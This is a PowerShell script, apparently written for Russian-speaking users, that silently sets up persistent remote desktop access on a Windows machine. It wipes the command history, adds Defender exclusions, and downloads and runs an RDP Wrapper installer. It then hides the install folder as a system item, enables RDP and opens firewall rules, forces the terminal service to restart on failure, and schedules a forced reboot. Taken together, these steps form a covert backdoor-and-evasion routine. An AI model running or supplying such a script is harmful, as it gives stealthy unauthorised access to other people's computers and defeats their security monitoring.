Clear-Host
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
$rdpwExe = "$env:TEMP\RDPW_Installer.exe"
$rdpwDir = "${env:ProgramFiles}\RDP Wrapper"
$shortcut = "$env:USERPROFILE\Desktop\RDP_CnC.lnk"
$groupId = '@FirewallAPI.dll,-28752'
$ruleNames = @(
    'RemoteDesktop-UserMode-In-TCP','RemoteDesktop-UserMode-In-UDP',
    'RemoteDesktop-Shadow-In-TCP','RemoteDesktop-Shadow-In-TCP_1',
    'RemoteDesktop-UserMode-In-UDP_1','RemoteDesktop-UserMode-In-TCP_1'
)
$errorCount = 0
function Retry-Command {
    param (
        [ScriptBlock]$action,
        [int]$attempts = 3,
        [int]$delay = 5
    )
    for ($i = 1; $i -le $attempts; $i++) {
        try {
            & $action > $null 2>&1
            return
        } catch {
            if ($i -eq $attempts) { throw }
            Start-Sleep -Seconds $delay
        }
    }
}
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Error "Пожалуйста, запустите этот скрипт от имени администратора!"
    exit 1
}
Retry-Command { Add-MpPreference -ExclusionPath $rdpwExe -ErrorAction SilentlyContinue }
Retry-Command { Add-MpPreference -ExclusionPath $rdpwDir -ErrorAction SilentlyContinue }
Retry-Command { Invoke-WebRequest -Uri "https://github.com/sebaxakerhtc/rdpwrap/releases/latest/download/RDPW_Installer.exe" -OutFile $rdpwExe }
if (Test-Path $rdpwExe) {
    Retry-Command { Start-Process -FilePath $rdpwExe -Wait }
    do {
        Start-Sleep -Seconds 5
        $rdpProcess = Get-Process -Name "RDP_CnC" -ErrorAction SilentlyContinue
    } while (-not $rdpProcess)
    Retry-Command { Stop-Process -Name "rdp_cnc" -Force -ErrorAction SilentlyContinue }
    if (Test-Path $shortcut) {
        Retry-Command { Remove-Item -Path $shortcut -Force -ErrorAction SilentlyContinue }
    }
}
Retry-Command { Remove-Item -Path $rdpwExe -Force -ErrorAction SilentlyContinue }
if (Test-Path $rdpwDir) {
    attrib +h +s $rdpwDir
}
Retry-Command {
    Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0 -Type DWord
}
Retry-Command { Enable-NetFirewallRule -Group $groupId -ErrorAction SilentlyContinue }
foreach ($name in $ruleNames) {
    try {
        Retry-Command { Set-NetFirewallRule -Name $name -Enabled True -ErrorAction SilentlyContinue }
    } catch {
        $errorCount++
    }
}
if ($errorCount -gt 0) {
    try {
        $port = (Get-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name PortNumber).PortNumber
    } catch {
        $port = 3389
    }
    foreach ($proto in 'TCP','UDP') {
        if (-not (Get-NetFirewallRule -Name "RDP-$proto-In-Port$port" -ErrorAction SilentlyContinue)) {
            Retry-Command {
                New-NetFirewallRule -Name "RDP-$proto-In-Port$port" -DisplayName "Allow RDP $proto Port $port" -Protocol $proto -LocalPort $port -Direction Inbound -Action Allow
            }
        }
    }
}
Retry-Command { Set-Service -Name TermService -StartupType Automatic }
Retry-Command { cmd /c "sc failure TermService reset=0 actions=restart/5000/restart/5000/restart/5000 >nul 2>&1" }
Retry-Command { Start-Service -Name TermService }
Retry-Command { sc start TermService }
Retry-Command { Remove-MpPreference -ExclusionPath $rdpwExe -ErrorAction SilentlyContinue }
Retry-Command { shutdown /r /t 900 /f }
Exit
